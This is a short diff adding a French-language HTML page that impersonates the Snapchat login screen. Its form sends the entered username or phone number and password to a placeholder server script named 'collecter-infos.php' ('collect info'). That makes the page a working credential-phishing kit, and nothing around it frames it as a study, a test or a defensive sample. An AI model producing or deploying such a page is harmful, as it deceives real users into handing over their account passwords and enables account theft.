@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Snapchat - Connexion</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .container { width: 300px; margin: 0 auto; }
+        input { width: 100%; padding: 10px; margin: 5px 0; }
+        button { width: 100%; padding: 10px; background-color: #fffc00; border: none; color: white; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Connexion à Snapchat</h2>
+        <form action="http://ton-serveur/collecter-infos.php" method="post">
+            <input type="text" name="username" placeholder="Nom d'utilisateur ou numéro de téléphone" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+        </form>
+    </div>
+</body>
+</html>
